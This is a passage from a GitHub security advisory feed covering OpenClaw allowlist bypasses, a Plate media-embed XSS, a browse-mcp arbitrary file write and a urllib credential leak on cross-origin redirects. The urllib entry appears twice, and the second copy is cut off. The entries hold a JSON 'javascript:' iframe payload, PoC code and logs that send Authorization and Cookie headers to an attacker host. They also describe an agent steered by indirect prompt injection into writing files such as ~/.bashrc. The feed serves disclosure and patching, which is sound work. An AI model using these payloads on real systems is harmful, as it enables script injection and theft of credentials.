<li><a href="https://github.com/versatica/mediasoup/pull/1829">https://github.com/versatica/mediasoup/pull/1829</a></li>
<li><a href="https://github.com/versatica/mediasoup/commit/9c1a90a8f9206b965e727d134846fb42df4980a7">https://github.com/versatica/mediasoup/commit/9c1a90a8f9206b965e727d134846fb42df4980a7</a></li>
<li><a href="https://github.com/versatica/mediasoup/releases/tag/3.20.6">https://github.com/versatica/mediasoup/releases/tag/3.20.6</a></li>
<li><a href="https://github.com/advisories/GHSA-p7x2-g5cq-fhmq">https://github.com/advisories/GHSA-p7x2-g5cq-fhmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p7x2-g5cq-fhmq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-25T18:17:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: Node pairing reconnection could confuse approval scope state]]></title>
        <id>https://github.com/advisories/GHSA-c85p-9pvr-f7f5</id>
        <link href="https://github.com/advisories/GHSA-c85p-9pvr-f7f5"/>
        <updated>2026-08-25T16:39:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-83w9-h5wv-j9xm. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.27 contains a state mutation vulnerability in node pairing reconnection that allows paired nodes to confuse approval scope decisions. Attackers can exploit reconnection logic to restore or present broader node authority than intended, potentially bypassing approval restrictions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-83w9-h5wv-j9xm">https://github.com/openclaw/openclaw/security/advisories/GHSA-83w9-h5wv-j9xm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53838">https://nvd.nist.gov/vuln/detail/CVE-2026-53838</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-node-pairing-state-mutation-via-reconnection">https://www.vulncheck.com/advisories/openclaw-node-pairing-state-mutation-via-reconnection</a></li>
<li><a href="https://github.com/advisories/GHSA-c85p-9pvr-f7f5">https://github.com/advisories/GHSA-c85p-9pvr-f7f5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c85p-9pvr-f7f5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-13T00:34:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: PowerShell encoded-command aliases could miss exec allowlist checks]]></title>
        <id>https://github.com/advisories/GHSA-ffhm-8fwq-7q27</id>
        <link href="https://github.com/advisories/GHSA-ffhm-8fwq-7q27"/>
        <updated>2026-08-25T16:39:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-j472-gf56-x589. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.12 contains an allowlist bypass vulnerability in PowerShell encoded-command handling that allows attackers to execute encoded commands using abbreviated flag aliases not recognized by the allowlist parser. Remote authenticated operators can bypass execution allowlist checks by using unrecognized encoded-command alias forms to execute arbitrary PowerShell content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-j472-gf56-x589">https://github.com/openclaw/openclaw/security/advisories/GHSA-j472-gf56-x589</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53836">https://nvd.nist.gov/vuln/detail/CVE-2026-53836</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-allowlist-bypass-via-powershell-encoded-command-aliases">https://www.vulncheck.com/advisories/openclaw-allowlist-bypass-via-powershell-encoded-command-aliases</a></li>
<li><a href="https://github.com/advisories/GHSA-ffhm-8fwq-7q27">https://github.com/advisories/GHSA-ffhm-8fwq-7q27</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffhm-8fwq-7q27</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-13T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw's POSIX node system.run safe-bin allowlist could be widened by shell expansion]]></title>
        <id>https://github.com/advisories/GHSA-gwcq-453v-2frr</id>
        <link href="https://github.com/advisories/GHSA-gwcq-453v-2frr"/>
        <updated>2026-08-25T16:38:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
<p>This advisory has been withdrawn because it is a duplicate of GHSA-mhq8-78pj-5j79. This link is maintained to preserve external references.</p>
<h3 id="original-description">Original Description</h3>
<p>OpenClaw before 2026.5.18 contains a policy enforcement vulnerability in system.run safe-bin allowlist validation that allows shell expansion to modify command interpretation on POSIX nodes. Authenticated operators can exploit shell metacharacters in approved commands to read unintended node-local files and expose sensitive configuration data.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-mhq8-78pj-5j79">https://github.com/openclaw/openclaw/security/advisories/GHSA-mhq8-78pj-5j79</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53831">https://nvd.nist.gov/vuln/detail/CVE-2026-53831</a></li>
<li><a href="https://www.vulncheck.com/advisories/openclaw-arbitrary-file-read-via-shell-expansion-in-system-run-safe-bin-allowlist">https://www.vulncheck.com/advisories/openclaw-arbitrary-file-read-via-shell-expansion-in-system-run-safe-bin-allowlist</a></li>
<li><a href="https://github.com/advisories/GHSA-gwcq-453v-2frr">https://github.com/advisories/GHSA-gwcq-453v-2frr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gwcq-453v-2frr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-13T00:34:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@platejs/media] Plate: Media embed provider metadata can bypass URL sanitization and execute iframe JavaScript]]></title>
        <id>https://github.com/advisories/GHSA-qj6x-xx2h-8hvv</id>
        <link href="https://github.com/advisories/GHSA-qj6x-xx2h-8hvv"/>
        <updated>2026-08-25T16:29:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The media embed renderer trusts serialized <code>provider</code> or <code>sourceUrl</code> metadata and skips the URL protocol validation that normally blocks unsafe media embed URLs. A crafted Plate document can set a known video provider while keeping <code>url</code> as a <code>javascript:</code> iframe source. When a victim opens that document in an app using the registry media embed component, the component renders the attacker URL directly as an iframe <code>src</code>.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can create or share Plate document content with another user can execute JavaScript in the victim browser context when the victim opens the document. This can expose application data available to the page and perform actions as the victim, depending on the host application's session model.</p>
<h2 id="reproduction">Reproduction</h2>
<p>Use a Plate editor or viewer that renders media embeds with the registry <code>MediaEmbedElement</code> and load a document containing this node:</p>
<pre><code class="language-json">{
  "type": "media_embed",
  "provider": "vimeo",
  "sourceUrl": "https://vimeo.com/1",
  "url": "javascript:parent.postMessage('plate-media-xss','*')",
  "children": [{ "text": "" }]
}
</code></pre>
<p>When rendered, the node is treated as a Vimeo media embed because <code>provider</code> is present. The iframe receives the unvalidated <code>url</code> value as its <code>src</code>.</p>
<h2 id="root-cause--technical-details">Root Cause / Technical Details</h2>
<p><code>parseMediaUrl</code> is the intended hardening point for media embed URLs and rejects parser output unless the URL protocol is <code>http:</code> or <code>https:</code>. However, <code>useMediaState</code> had a fast path for serialized nodes that already contain <code>provider</code> or <code>sourceUrl</code>. That fast path returned <code>{ id, provider, sourceUrl, url }</code> directly and did not call <code>parseMediaUrl</code> or otherwise validate the stored <code>url</code>.</p>
<p>The registry <code>MediaEmbedElement</code> then checks that <code>embed.provider</code> is one of the video providers and renders non-YouTube video providers with <code>&lt;iframe src={embed.url}&gt;</code>. Because <code>provider</code> is attacker-controlled serialized document metadata, it can be set to <code>vimeo</code> while <code>url</code> remains <code>javascript:...</code>.</p>
<p>This is fixed in <code>@platejs/media</code> 53.1.4 by recomputing embed metadata from the render URL instead of trusting serialized <code>provider</code>, <code>id</code>, or <code>sourceUrl</code> metadata.</p>
<h2 id="poc-evidence">PoC Evidence</h2>
<p>A browser proof using the same data flow set an iframe <code>src</code> to:</p>
<pre><code class="language-text">javascript:parent.postMessage('plate-media-xss','*')
</code></pre>
<p>Chromium executed the iframe JavaScript and the parent page received <code>plate-media-xss</code>, confirming execution from the iframe source.</p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade <code>@platejs/media</code> to 53.1.4 or later. Treat <code>provider</code>, <code>sourceUrl</code>, and <code>id</code> in serialized documents as untrusted derived metadata. Recompute embed metadata from <code>url</code> with <code>parseMediaUrl</code>, or at minimum validate any fast-path <code>url</code> with the same protocol allowlist before rendering an iframe.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/udecode/plate/security/advisories/GHSA-qj6x-xx2h-8hvv">https://github.com/udecode/plate/security/advisories/GHSA-qj6x-xx2h-8hvv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55596">https://nvd.nist.gov/vuln/detail/CVE-2026-55596</a></li>
<li><a href="https://github.com/udecode/plate/pull/5014">https://github.com/udecode/plate/pull/5014</a></li>
<li><a href="https://github.com/udecode/plate/commit/6214914ca811adf22d0ad503154494216eed68ba">https://github.com/udecode/plate/commit/6214914ca811adf22d0ad503154494216eed68ba</a></li>
<li><a href="https://github.com/udecode/plate/releases/tag/v53.1.4">https://github.com/udecode/plate/releases/tag/v53.1.4</a></li>
<li><a href="https://github.com/advisories/GHSA-qj6x-xx2h-8hvv">https://github.com/advisories/GHSA-qj6x-xx2h-8hvv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qj6x-xx2h-8hvv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:29:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[browse-mcp] browse-mcp has an arbitrary file write via unconfined download and state paths]]></title>
        <id>https://github.com/advisories/GHSA-m9mq-7m7q-xc6p</id>
        <link href="https://github.com/advisories/GHSA-m9mq-7m7q-xc6p"/>
        <updated>2026-08-25T16:28:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><code>browser_download</code> wrote a fetched file to <code>join(save_dir, filename)</code> with no validation of <code>save_dir</code>, and <code>browser_save_state</code> / <code>browser_load_state</code> honored an explicit <code>path</code> unchanged. The MCP caller controls these arguments (a malicious MCP client, or an autonomous agent steered by indirect prompt injection on a visited page), so an attacker could supply an arbitrary <code>save_dir</code> (or state <code>path</code>) together with a URL whose response body became the file contents, writing attacker-controlled bytes to any path the process can reach (for example <code>~/.bashrc</code>, an autostart entry, or a cron file). That is an arbitrary file write that can lead to host code execution. The <code>force_fetch</code> fallback additionally used a raw <code>fetch()</code> that bypassed the <code>BROWSE_MCP_ALLOWED_ORIGINS</code> origin fence.</p>
<p>Estimated severity: CVSS 3.1 around 7.8 (High) for the local / agent-mediated case.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in 0.8.2. <code>save_dir</code> is confined under the download root (<code>~/.browse-mcp/downloads</code>) and the explicit state <code>path</code> under <code>~/.browse-mcp/state</code>; absolute paths and <code>..</code> escapes are rejected, and download filenames are reduced to a bare basename. <code>force_fetch</code> now also honors the origin fence. Data roots remain relocatable via <code>BROWSE_MCP_HOME</code>. Upgrade to browse-mcp 0.8.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Restrict the exposed tools with <code>BROWSE_MCP_TOOLS</code> to a set that excludes <code>browser_download</code>, <code>browser_save_state</code>, and <code>browser_load_state</code> (for example the hardened recipe in SECURITY.md). Note that the allowlist hides the tools from an agent but does not stop a malicious MCP client from calling them by name, so upgrading is the real fix.</p>
<ul>
<li>Reported privately by novice-22.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/That1Drifter/browse-mcp/security/advisories/GHSA-m9mq-7m7q-xc6p">https://github.com/That1Drifter/browse-mcp/security/advisories/GHSA-m9mq-7m7q-xc6p</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/pull/58">https://github.com/That1Drifter/browse-mcp/pull/58</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/commit/5352a4a56f626254b445bfa07e4bb48c5aad15c1">https://github.com/That1Drifter/browse-mcp/commit/5352a4a56f626254b445bfa07e4bb48c5aad15c1</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/blob/v0.8.2/CHANGELOG.md#082---2026-06-13">https://github.com/That1Drifter/browse-mcp/blob/v0.8.2/CHANGELOG.md#082---2026-06-13</a></li>
<li><a href="https://github.com/That1Drifter/browse-mcp/releases/tag/v0.8.2">https://github.com/That1Drifter/browse-mcp/releases/tag/v0.8.2</a></li>
<li><a href="https://github.com/advisories/GHSA-m9mq-7m7q-xc6p">https://github.com/advisories/GHSA-m9mq-7m7q-xc6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m9mq-7m7q-xc6p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:28:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib] urllib's cross-origin redirects preserve credential-bearing request headers, leading to potential credential leakage]]></title>
        <id>https://github.com/advisories/GHSA-hq3h-g68c-hp78</id>
        <link href="https://github.com/advisories/GHSA-hq3h-g68c-hp78"/>
        <updated>2026-08-25T16:19:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>urllib supports redirect-following through <code>followRedirect</code>, which is expected behavior for an HTTP client. The issue is that, when following a redirect to a <strong>different origin</strong>, urllib preserves the caller-supplied request headers verbatim, including credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, <code>Proxy-Authorization</code>, and custom auth headers (<code>x-api-key</code>, <code>x-auth-token</code>, <code>x-access-token</code>).</p>
<p>If the redirect target is attacker-controlled or outside the trust boundary of the original target, credentials intended for the original origin can be delivered to the redirected origin. In a local multi-library reproduction, urllib v4.9.0 was the only tested client that stripped no headers on cross-origin redirect.</p>
<h2 id="affected-behavior">Affected behavior</h2>
<p>Confirmed against urllib v4.9.0. The relevant code is in <code>#requestInternal</code> (<a href="https://github.com/node-modules/urllib/blob/master/src/HttpClient.ts#L639-L656"><code>src/HttpClient.ts:639-656</code></a>):</p>
<pre><code class="language-ts">     // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      if (RedirectStatusCodes.includes(res.statusCode) &amp;&amp; maxRedirects &gt; 0 &amp;&amp; requestContext.redirects &lt; maxRedirects) {
        if (res.headers.location) {
          requestContext.redirects++;
          const nextUrl = new URL(res.headers.location, requestUrl.href);
          // Ensure the response is consumed
          await response.body.arrayBuffer();
          debug(
            'Request#%d got response, status: %s, headers: %j, timing: %j, redirect to %s',
            requestId,
            res.status,
            res.headers,
            res.timing,
            nextUrl.href,
          );
          return await this.#requestInternal(nextUrl.href, options, requestContext);
        }
      }
</code></pre>
<p>The recursive call <code>this.#requestInternal(nextUrl.href, options, requestContext)</code> reuses the original <code>options</code> object. If the caller supplied credential-bearing headers in <code>options.headers</code>, those headers are reused for the redirected request, regardless of whether the redirect target shares the original origin.</p>
<h2 id="redirect-header-handling-context">Redirect-header handling context</h2>
<p>The CHANGELOG suggests that redirect-related header handling has been considered before, including changes around preserving or cleaning up <code>Host</code> during redirects. Given that context, sensitive-header stripping may be an unintentional gap rather than an explicit policy decision.</p>
<h2 id="proof-of-concept-3-container-topology">Proof of Concept: 3-container topology</h2>
<p>The reproduction uses three separate containers (<code>partner</code>, <code>attacker</code>, <code>client</code>) connected over a Podman bridge network. Each container has its own hostname, port, and process, so the redirect crosses a clear origin boundary. This is not a <code>localhost</code> vs <code>127.0.0.1</code> same-host case.</p>
<pre><code class="language-text">[client container]                       [partner container]              [attacker container]
hostname: client                         hostname: partner                hostname: attacker
                                         port: 3001                       port: 3002
   urllib v4.9.0
        │
        │ GET http://partner:3001/start
        │ + 6 credential-bearing headers
        ↓
                                         302 Location:
                                         http://attacker:3002/captured
                                                   │
                                                   │ urllib follows redirect
                                                   │ → DIFFERENT ORIGIN
                                                   │   (different hostname and port)
                                                   │ → all 6 headers preserved
                                                   ↓
                                                                          headers logged
                                                                          inside attacker
                                                                          container
</code></pre>
<p>The origin tuple is <code>(scheme, host, port)</code>:</p>
<ul>
<li>source origin: <code>http://partner:3001</code></li>
<li>destination origin: <code>http://attacker:3002</code></li>
</ul>
<p>The host and port both differ, so the redirect target is a different URL origin. The headers are logged in a separate process inside a separate container.</p>
<p><strong>Client invocation</strong> (<code>client/poc.mjs</code>):</p>
<pre><code class="language-javascript">import urllib from 'urllib' // v4.9.0

await urllib.request('http://partner:3001/start', {
  followRedirect: true,
  maxRedirects: 5,
  headers: {
    'Authorization': 'Bearer LIVE-AUTH-3CONTAINER',
    'Cookie': 'session=LIVE-COOKIE-3CONTAINER',
    'Proxy-Authorization': 'Bearer proxy-LIVE-3CONTAINER',
    'x-api-key': 'sk-LIVE-3CONTAINER-x123',
    'x-auth-token': 'auth-LIVE-3CONTAINER-y456',
    'x-access-token': 'access-LIVE-3CONTAINER-z789',
  },
})
</code></pre>
<p><strong>Observed result</strong><br>urllib 4.9.0, Node.js 22.22.2, linux/arm64:</p>
<pre><code class="language-text">[attacker] CAPTURED HEADERS:
  "authorization":       "Bearer LIVE-AUTH-3CONTAINER"
  "cookie":              "session=LIVE-COOKIE-3CONTAINER"
  "proxy-authorization": "Bearer proxy-LIVE-3CONTAINER"
  "x-api-key":           "sk-LIVE-3CONTAINER-x123"
  "x-auth-token":        "auth-LIVE-3CONTAINER-y456"
  "x-access-token":      "access-LIVE-3CONTAINER-z789"
  "user-agent":          "node-urllib/4.9.0 Node.js/22.22.2 (linux; arm64)"

LEAK RATE: 6/6
</code></pre>
<p>The <code>user-agent</code> value confirms that the redirected request was sent by urllib v4.9.0.</p>
<h2 id="independent-reproduction-multi-library-comparison">Independent reproduction: multi-library comparison</h2>
<p>A separate local harness tested the same cross-origin redirect topology against multiple Node.js HTTP clients:</p>
<ul>
<li>same <code>partner:3001 → attacker:3002</code> redirect;</li>
<li>same six credential-bearing headers;</li>
<li>same RFC 6454 origin boundary.</li>
</ul>
<p>The results were deterministic across runs:</p>
<table>
<thead>
<tr>
<th>Library</th>
<th align="right">Leak rate</th>
<th>Headers stripped on cross-origin redirect</th>
</tr>
</thead>
<tbody><tr>
<td>undici 6.21.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>needle 3.5.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>node-fetch 3.3.2</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>superagent 10.3.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>@hapi/wreck 18.1.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>request 2.88.2</td>
<td align="right">5/6</td>
<td><code>authorization</code></td>
</tr>
<tr>
<td><strong>urllib 4.9.0</strong></td>
<td align="right"><strong>6/6</strong></td>
<td><strong>none</strong></td>
</tr>
</tbody></table>
<p><code>urllib</code> was the only tested library that stripped no headers on cross-origin redirect. Custom auth headers such as <code>x-api-key</code>, <code>x-auth-token</code>, and <code>x-access-token</code> are an ecosystem-wide gap in this comparison. The urllib-specific issue is the absence of any strip step for standard credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code>.</p>
<p>The reproduction harness is small and can be shared if useful.</p>
<h2 id="impact">Impact</h2>
<p>This affects Node.js applications that use urllib to make authenticated HTTP requests while allowing redirects to be followed automatically.</p>
<pre><code class="language-text">1. Application sends an authenticated request:
     GET https://api.partner.example/data
     Authorization: Bearer &lt;token&gt;
     Cookie: session=&lt;session-id&gt;

2. The partner endpoint, a compromised intermediary, or a misconfigured CDN returns:
     302 Location: https://attacker.example/captured

3. urllib follows the redirect and sends the original Authorization and Cookie headers
   to attacker.example.
</code></pre>
<p>This exposes credentials to an origin that was not the intended recipient. Depending on the credential type and server-side validation, the leaked credentials may be reusable against the original partner API or related services.</p>
<p>This requires no user interaction. Realistic triggers include compromised partner subdomains, DNS hijacking, malicious partner endpoints during onboarding, internal services redirecting across trust boundaries, or an open redirect upstream of urllib's call site.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78">https://github.com/node-modules/urllib/security/advisories/GHSA-hq3h-g68c-hp78</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/812">https://github.com/node-modules/urllib/pull/812</a></li>
<li><a href="https://github.com/node-modules/urllib/pull/813">https://github.com/node-modules/urllib/pull/813</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16">https://github.com/node-modules/urllib/commit/7c86c465883ebd3dea5109c87d7bbe3b00960a16</a></li>
<li><a href="https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46">https://github.com/node-modules/urllib/commit/811a8d56e64e540bf6a19bf8b3737692f05d5c46</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v2.44.1">https://github.com/node-modules/urllib/releases/tag/v2.44.1</a></li>
<li><a href="https://github.com/node-modules/urllib/releases/tag/v4.9.1">https://github.com/node-modules/urllib/releases/tag/v4.9.1</a></li>
<li><a href="https://github.com/advisories/GHSA-hq3h-g68c-hp78">https://github.com/advisories/GHSA-hq3h-g68c-hp78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq3h-g68c-hp78</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T16:19:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[urllib] urllib's cross-origin redirects preserve credential-bearing request headers, leading to potential credential leakage]]></title>
        <id>https://github.com/advisories/GHSA-hq3h-g68c-hp78</id>
        <link href="https://github.com/advisories/GHSA-hq3h-g68c-hp78"/>
        <updated>2026-08-25T16:19:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>urllib supports redirect-following through <code>followRedirect</code>, which is expected behavior for an HTTP client. The issue is that, when following a redirect to a <strong>different origin</strong>, urllib preserves the caller-supplied request headers verbatim, including credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, <code>Proxy-Authorization</code>, and custom auth headers (<code>x-api-key</code>, <code>x-auth-token</code>, <code>x-access-token</code>).</p>
<p>If the redirect target is attacker-controlled or outside the trust boundary of the original target, credentials intended for the original origin can be delivered to the redirected origin. In a local multi-library reproduction, urllib v4.9.0 was the only tested client that stripped no headers on cross-origin redirect.</p>
<h2 id="affected-behavior">Affected behavior</h2>
<p>Confirmed against urllib v4.9.0. The relevant code is in <code>#requestInternal</code> (<a href="https://github.com/node-modules/urllib/blob/master/src/HttpClient.ts#L639-L656"><code>src/HttpClient.ts:639-656</code></a>):</p>
<pre><code class="language-ts">     // https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
      if (RedirectStatusCodes.includes(res.statusCode) &amp;&amp; maxRedirects &gt; 0 &amp;&amp; requestContext.redirects &lt; maxRedirects) {
        if (res.headers.location) {
          requestContext.redirects++;
          const nextUrl = new URL(res.headers.location, requestUrl.href);
          // Ensure the response is consumed
          await response.body.arrayBuffer();
          debug(
            'Request#%d got response, status: %s, headers: %j, timing: %j, redirect to %s',
            requestId,
            res.status,
            res.headers,
            res.timing,
            nextUrl.href,
          );
          return await this.#requestInternal(nextUrl.href, options, requestContext);
        }
      }
</code></pre>
<p>The recursive call <code>this.#requestInternal(nextUrl.href, options, requestContext)</code> reuses the original <code>options</code> object. If the caller supplied credential-bearing headers in <code>options.headers</code>, those headers are reused for the redirected request, regardless of whether the redirect target shares the original origin.</p>
<h2 id="redirect-header-handling-context">Redirect-header handling context</h2>
<p>The CHANGELOG suggests that redirect-related header handling has been considered before, including changes around preserving or cleaning up <code>Host</code> during redirects. Given that context, sensitive-header stripping may be an unintentional gap rather than an explicit policy decision.</p>
<h2 id="proof-of-concept-3-container-topology">Proof of Concept: 3-container topology</h2>
<p>The reproduction uses three separate containers (<code>partner</code>, <code>attacker</code>, <code>client</code>) connected over a Podman bridge network. Each container has its own hostname, port, and process, so the redirect crosses a clear origin boundary. This is not a <code>localhost</code> vs <code>127.0.0.1</code> same-host case.</p>
<pre><code class="language-text">[client container]                       [partner container]              [attacker container]
hostname: client                         hostname: partner                hostname: attacker
                                         port: 3001                       port: 3002
   urllib v4.9.0
        │
        │ GET http://partner:3001/start
        │ + 6 credential-bearing headers
        ↓
                                         302 Location:
                                         http://attacker:3002/captured
                                                   │
                                                   │ urllib follows redirect
                                                   │ → DIFFERENT ORIGIN
                                                   │   (different hostname and port)
                                                   │ → all 6 headers preserved
                                                   ↓
                                                                          headers logged
                                                                          inside attacker
                                                                          container
</code></pre>
<p>The origin tuple is <code>(scheme, host, port)</code>:</p>
<ul>
<li>source origin: <code>http://partner:3001</code></li>
<li>destination origin: <code>http://attacker:3002</code></li>
</ul>
<p>The host and port both differ, so the redirect target is a different URL origin. The headers are logged in a separate process inside a separate container.</p>
<p><strong>Client invocation</strong> (<code>client/poc.mjs</code>):</p>
<pre><code class="language-javascript">import urllib from 'urllib' // v4.9.0

await urllib.request('http://partner:3001/start', {
  followRedirect: true,
  maxRedirects: 5,
  headers: {
    'Authorization': 'Bearer LIVE-AUTH-3CONTAINER',
    'Cookie': 'session=LIVE-COOKIE-3CONTAINER',
    'Proxy-Authorization': 'Bearer proxy-LIVE-3CONTAINER',
    'x-api-key': 'sk-LIVE-3CONTAINER-x123',
    'x-auth-token': 'auth-LIVE-3CONTAINER-y456',
    'x-access-token': 'access-LIVE-3CONTAINER-z789',
  },
})
</code></pre>
<p><strong>Observed result</strong><br>urllib 4.9.0, Node.js 22.22.2, linux/arm64:</p>
<pre><code class="language-text">[attacker] CAPTURED HEADERS:
  "authorization":       "Bearer LIVE-AUTH-3CONTAINER"
  "cookie":              "session=LIVE-COOKIE-3CONTAINER"
  "proxy-authorization": "Bearer proxy-LIVE-3CONTAINER"
  "x-api-key":           "sk-LIVE-3CONTAINER-x123"
  "x-auth-token":        "auth-LIVE-3CONTAINER-y456"
  "x-access-token":      "access-LIVE-3CONTAINER-z789"
  "user-agent":          "node-urllib/4.9.0 Node.js/22.22.2 (linux; arm64)"

LEAK RATE: 6/6
</code></pre>
<p>The <code>user-agent</code> value confirms that the redirected request was sent by urllib v4.9.0.</p>
<h2 id="independent-reproduction-multi-library-comparison">Independent reproduction: multi-library comparison</h2>
<p>A separate local harness tested the same cross-origin redirect topology against multiple Node.js HTTP clients:</p>
<ul>
<li>same <code>partner:3001 → attacker:3002</code> redirect;</li>
<li>same six credential-bearing headers;</li>
<li>same RFC 6454 origin boundary.</li>
</ul>
<p>The results were deterministic across runs:</p>
<table>
<thead>
<tr>
<th>Library</th>
<th align="right">Leak rate</th>
<th>Headers stripped on cross-origin redirect</th>
</tr>
</thead>
<tbody><tr>
<td>undici 6.21.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>needle 3.5.0</td>
<td align="right">3/6</td>
<td><code>authorization</code>, <code>cookie</code>, <code>proxy-authorization</code></td>
</tr>
<tr>
<td>node-fetch 3.3.2</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>superagent 10.3.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>@hapi/wreck 18.1.0</td>
<td align="right">4/6</td>
<td><code>authorization</code>, <code>cookie</code></td>
</tr>
<tr>
<td>request 2.88.2</td>
<td align="right">5/6</td>
<td><code>authorization</code></td>
</tr>
<tr>
<td><strong>urllib 4.9.0</strong></td>
<td align="right"><strong>6/6</strong></td>
<td><strong>none</strong></td>
</tr>
</tbody></table>
<p><code>urllib</code> was the only tested library that stripped no headers on cross-origin redirect. Custom auth headers such as <code>x-api-key</code>, <code>x-auth-token</code>, and <code>x-access-token</code> are an ecosystem-wide gap in this comparison. The urllib-specific issue is the absence of any strip step for standard credential-bearing headers such as <code>Authorization</code>, <code>Cookie</code>, and <code>Proxy-Authorization</code>.</p>
<p>The reproduction harness is small and can be shared if useful.</p>
<h2 id="impact">Impact</h2>
<p>This affects Node.js applications that use urllib to make authenticated HTTP requests while allowing redirects to be followed automatically.</p>
<pre><code class="language-text">1. Application sends an authenticated request:
     GET https://api.partner.example/data
     Authorization: Bearer &lt;token&gt;
     Cookie: session=&lt;session-id&gt;

2. The partner endpoint, a compromised intermediary, or a misconfigured CDN returns:
     302 Location: https://attacker.example/captured

3. urllib follows the redirect and sends the original Authorization and Cookie headers
   to attacker.example.
</code></pre>
